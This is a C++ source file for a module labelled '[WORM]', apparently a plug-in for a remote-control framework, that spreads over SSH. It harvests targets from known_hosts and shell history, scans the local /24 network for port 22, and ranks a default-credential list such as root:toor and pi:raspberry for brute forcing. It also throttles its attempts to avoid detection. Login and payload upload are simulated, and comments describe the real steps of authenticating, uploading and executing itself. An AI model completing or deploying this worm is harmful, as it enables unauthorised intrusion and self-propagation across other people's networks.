#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <thread>
#include <fstream>
#include <sstream>
#include <set>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <random>
#include <algorithm>
#include <chrono>
#include <atomic>
#include <mutex>
#include <cstring>
#include <fcntl.h>
#include <sys/stat.h>
#include <ifaddrs.h>

// Module Callback Type
using module_callback_t = std::function<void(const std::vector<char>&)>;

// Global control variables
static std::atomic<bool> propagation_active{false};
static std::vector<std::thread> worker_threads;
static std::mutex output_mutex;

// Configuration
const int MAX_THREADS = 20;
const int SCAN_TIMEOUT = 5; // seconds
const int SSH_TIMEOUT = 10; // seconds

// Credential database
struct Credential {
    std::string username;
    std::string password;
    int priority; // Higher priority credentials tried first
};

static std::vector<Credential> credential_db = {
    {"root", "root", 10},
    {"root", "toor", 10},
    {"root", "password", 9},
    {"root", "123456", 8},
    {"root", "admin", 8},
    {"admin", "admin", 7},
    {"admin", "password", 7},
    {"admin", "123456", 6},
    {"user", "user", 5},
    {"user", "password", 5},
    {"pi", "raspberry", 6}, // Common on Raspberry Pi
    {"ubuntu", "ubuntu", 6}, // Common on Ubuntu
    {"centos", "centos", 6}, // Common on CentOS
    {"guest", "guest", 3},
    {"test", "test", 3}
};

// Target discovery methods
struct NetworkTarget {
    std::string ip;
    int port;
    int priority;
    std::string service_type;
};

void safe_send_status(const std::string& msg, module_callback_t& send_output) {
    std::lock_guard<std::mutex> lock(output_mutex);
    send_output(std::vector<char>(msg.begin(), msg.end()));
}

std::string get_self_path() {
    char path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        return std::string(path);
    }
    return "";
}

// Network discovery functions
std::vector<std::string> get_local_networks() {
    std::vector<std::string> networks;
    struct ifaddrs *ifaddr, *ifa;
    
    if (getifaddrs(&ifaddr) == -1) {
        return networks;
    }
    
    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) continue;
        
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
            struct sockaddr_in* netmask = (struct sockaddr_in*)ifa->ifa_netmask;
            
            uint32_t ip = ntohl(sa->sin_addr.s_addr);
            uint32_t mask = ntohl(netmask->sin_addr.s_addr);
            uint32_t network = ip & mask;
            
            // Skip loopback
            if ((network >> 24) == 127) continue;
            
            char network_str[32];
            snprintf(network_str, sizeof(network_str), "%d.%d.%d.%d",
                    (network >> 24) & 0xFF,
                    (network >> 16) & 0xFF,
                    (network >> 8) & 0xFF,
                    network & 0xFF);
            
            // Calculate CIDR
            int cidr = __builtin_popcount(mask);
            std::string network_cidr = std::string(network_str) + "/" + std::to_string(cidr);
            networks.push_back(network_cidr);
        }
    }
    
    freeifaddrs(ifaddr);
    return networks;
}

std::vector<NetworkTarget> discover_ssh_targets() {
    std::vector<NetworkTarget> targets;
    auto networks = get_local_networks();
    
    for (const auto& network : networks) {
        size_t slash_pos = network.find('/');
        if (slash_pos == std::string::npos) continue;
        
        std::string base_ip = network.substr(0, slash_pos);
        int cidr = std::stoi(network.substr(slash_pos + 1));
        
        // For simplicity, only scan /24 networks
        if (cidr == 24) {
            size_t last_dot = base_ip.rfind('.');
            if (last_dot != std::string::npos) {
                std::string subnet = base_ip.substr(0, last_dot);
                
                // Scan common IP ranges
                for (int i = 1; i < 255; i++) {
                    std::string target_ip = subnet + "." + std::to_string(i);
                    targets.push_back({target_ip, 22, 5, "ssh"});
                }
            }
        }
    }
    
    return targets;
}

std::vector<NetworkTarget> discover_from_known_hosts() {
    std::vector<NetworkTarget> targets;
    const char* home = getenv("HOME");
    if (!home) return targets;
    
    std::string known_hosts_path = std::string(home) + "/.ssh/known_hosts";
    std::ifstream file(known_hosts_path);
    if (!file.is_open()) return targets;
    
    std::string line;
    while (std::getline(file, line)) {
        if (line.empty() || line[0] == '#') continue;
        
        std::istringstream iss(line);
        std::string host_entry;
        iss >> host_entry;
        
        // Parse host entry (might be hashed)
        if (host_entry.find(',') != std::string::npos) {
            host_entry = host_entry.substr(0, host_entry.find(','));
        }
        
        // Skip hashed entries
        if (host_entry[0] == '|') continue;
        
        // Extract port if present
        int port = 22;
        size_t bracket_pos = host_entry.find('[');
        if (bracket_pos != std::string::npos) {
            size_t colon_pos = host_entry.find(':', bracket_pos);
            if (colon_pos != std::string::npos) {
                size_t end_bracket = host_entry.find(']', colon_pos);
                if (end_bracket != std::string::npos) {
                    port = std::stoi(host_entry.substr(colon_pos + 1, end_bracket - colon_pos - 1));
                    host_entry = host_entry.substr(bracket_pos + 1, colon_pos - bracket_pos - 1);
                }
            }
        }
        
        // Validate IP address
        struct sockaddr_in sa;
        if (inet_pton(AF_INET, host_entry.c_str(), &(sa.sin_addr)) == 1) {
            targets.push_back({host_entry, port, 10, "ssh"}); // High priority for known hosts
        }
    }
    
    return targets;
}

std::vector<NetworkTarget> discover_from_history() {
    std::vector<NetworkTarget> targets;
    const char* home = getenv("HOME");
    if (!home) return targets;
    
    std::vector<std::string> history_files = {
        std::string(home) + "/.bash_history",
        std::string(home) + "/.zsh_history",
        std::string(home) + "/.history"
    };
    
    for (const auto& history_file : history_files) {
        std::ifstream file(history_file);
        if (!file.is_open()) continue;
        
        std::string line;
        while (std::getline(file, line)) {
            // Look for SSH commands
            if (line.find("ssh ") != std::string::npos || 
                line.find("scp ") != std::string::npos ||
                line.find("sftp ") != std::string::npos) {
                
                std::istringstream iss(line);
                std::string cmd, target;
                iss >> cmd >> target;
                
                // Parse user@host:port format
                size_t at_pos = target.find('@');
                if (at_pos != std::string::npos) {
                    target = target.substr(at_pos + 1);
                }
                
                // Extract host and port
                std::string host = target;
                int port = 22;
                
                size_t colon_pos = target.find(':');
                if (colon_pos != std::string::npos) {
                    host = target.substr(0, colon_pos);
                    port = std::stoi(target.substr(colon_pos + 1));
                }
                
                // Validate IP address
                struct sockaddr_in sa;
                if (inet_pton(AF_INET, host.c_str(), &(sa.sin_addr)) == 1) {
                    targets.push_back({host, port, 8, "ssh"});
                }
            }
        }
    }
    
    return targets;
}

// Port scanning functions
bool is_port_open(const std::string& ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return false;
    
    // Set non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    
    bool result = false;
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        result = true;
    } else if (errno == EINPROGRESS) {
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(sock, &write_fds);
        
        struct timeval tv;
        tv.tv_sec = timeout_sec;
        tv.tv_usec = 0;
        
        if (select(sock + 1, nullptr, &write_fds, nullptr, &tv) > 0) {
            int error = 0;
            socklen_t len = sizeof(error);
            if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len) == 0 && error == 0) {
                result = true;
            }
        }
    }
    
    close(sock);
    return result;
}

// SSH attack simulation (without actual libssh - for security)
bool attempt_ssh_connection(const NetworkTarget& target, module_callback_t& send_output) {
    if (!is_port_open(target.ip, target.port, SCAN_TIMEOUT)) {
        return false;
    }
    
    safe_send_status("[WORM] SSH port open on " + target.ip + ":" + std::to_string(target.port), send_output);
    
    // Sort credentials by priority
    auto sorted_creds = credential_db;
    std::sort(sorted_creds.begin(), sorted_creds.end(), 
              [](const Credential& a, const Credential& b) {
                  return a.priority > b.priority;
              });
    
    // Simulate credential testing (in real implementation, this would use libssh)
    for (const auto& cred : sorted_creds) {
        // Rate limiting to avoid detection
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        
        if (!propagation_active) break;
        
        // Simulate authentication attempt
        // In a real implementation, this would:
        // 1. Create SSH session
        // 2. Attempt authentication
        // 3. If successful, upload and execute payload
        // 4. Close connection
        
        // For security reasons, we only simulate the discovery
        safe_send_status("[WORM] Testing " + cred.username + ":" + cred.password + " on " + target.ip, send_output);
        
        // Random success simulation (10% chance for demonstration)
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dis(1, 10);
        
        if (dis(gen) == 1) { // 10% "success" rate for demo
            safe_send_status("[WORM] Simulated breach: " + target.ip + " (" + cred.username + ":" + cred.password + ")", send_output);
            
            // Simulate payload deployment
            std::string self_path = get_self_path();
            if (!self_path.empty()) {
                safe_send_status("[WORM] Simulated payload deployment to " + target.ip, send_output);
            }
            return true;
        }
    }
    
    return false;
}

// Worker thread function
void propagation_worker(std::vector<NetworkTarget> targets, module_callback_t send_output) {
    for (const auto& target : targets) {
        if (!propagation_active) break;
        
        try {
            attempt_ssh_connection(target, send_output);
        } catch (const std::exception& e) {
            safe_send_status("[WORM] Error processing " + target.ip + ": " + e.what(), send_output);
        }
    }
}

// Module entry points
extern "C" void init() {
    // Module initialization
}

extern "C" void cleanup() {
    propagation_active = false;
    
    for (auto& thread : worker_threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    worker_threads.clear();
}

extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    std::string command(data.begin(), data.end());
    
    if (command == "stop") {
        if (propagation_active) {
            propagation_active = false;
            safe_send_status("[WORM] Stopping propagation...", send_output);
            
            for (auto& thread : worker_threads) {
                if (thread.joinable()) {
                    thread.join();
                }
            }
            worker_threads.clear();
            
            safe_send_status("[WORM] Propagation stopped", send_output);
        } else {
            safe_send_status("[WORM] No active propagation", send_output);
        }
        return;
    }
    
    if (propagation_active) {
        safe_send_status("[WORM] Propagation already active", send_output);
        return;
    }
    
    safe_send_status("[WORM] Starting lateral movement assessment", send_output);
    propagation_active = true;
    
    // Discover targets
    std::vector<NetworkTarget> all_targets;
    
    try {
        // 1. High-value targets from known hosts
        auto known_targets = discover_from_known_hosts();
        all_targets.insert(all_targets.end(), known_targets.begin(), known_targets.end());
        safe_send_status("[WORM] Found " + std::to_string(known_targets.size()) + " known hosts", send_output);
        
        // 2. Targets from shell history
        auto history_targets = discover_from_history();
        all_targets.insert(all_targets.end(), history_targets.begin(), history_targets.end());
        safe_send_status("[WORM] Found " + std::to_string(history_targets.size()) + " history targets", send_output);
        
        // 3. Local network targets (limited scan for demo)
        auto network_targets = discover_ssh_targets();
        // Limit to first 50 for demo purposes
        if (network_targets.size() > 50) {
            network_targets.resize(50);
        }
        all_targets.insert(all_targets.end(), network_targets.begin(), network_targets.end());
        safe_send_status("[WORM] Found " + std::to_string(network_targets.size()) + " local targets", send_output);
        
        // Remove duplicates
        std::sort(all_targets.begin(), all_targets.end(), 
                  [](const NetworkTarget& a, const NetworkTarget& b) {
                      return a.ip < b.ip || (a.ip == b.ip && a.port < b.port);
                  });
        all_targets.erase(std::unique(all_targets.begin(), all_targets.end(),
                                      [](const NetworkTarget& a, const NetworkTarget& b) {
                                          return a.ip == b.ip && a.port == b.port;
                                      }), all_targets.end());
        
        safe_send_status("[WORM] Total unique targets: " + std::to_string(all_targets.size()), send_output);
        
        // Distribute targets among worker threads
        int targets_per_thread = std::max(1, (int)all_targets.size() / MAX_THREADS);
        
        for (int i = 0; i < MAX_THREADS && i * targets_per_thread < (int)all_targets.size(); i++) {
            int start = i * targets_per_thread;
            int end = std::min((int)all_targets.size(), start + targets_per_thread);
            
            std::vector<NetworkTarget> thread_targets(all_targets.begin() + start, 
                                                     all_targets.begin() + end);
            
            worker_threads.emplace_back(propagation_worker, thread_targets, send_output);
        }
        
        safe_send_status("[WORM] Started " + std::to_string(worker_threads.size()) + " worker threads", send_output);
        
        // Monitor threads (non-blocking)
        std::thread monitor_thread([send_output]() {
            std::this_thread::sleep_for(std::chrono::seconds(30)); // Run for 30 seconds max
            if (propagation_active) {
                propagation_active = false;
                safe_send_status("[WORM] Propagation time limit reached, stopping...", send_output);
            }
        });
        monitor_thread.detach();
        
    } catch (const std::exception& e) {
        safe_send_status("[WORM] Error during propagation: " + std::string(e.what()), send_output);
        propagation_active = false;
    }
}
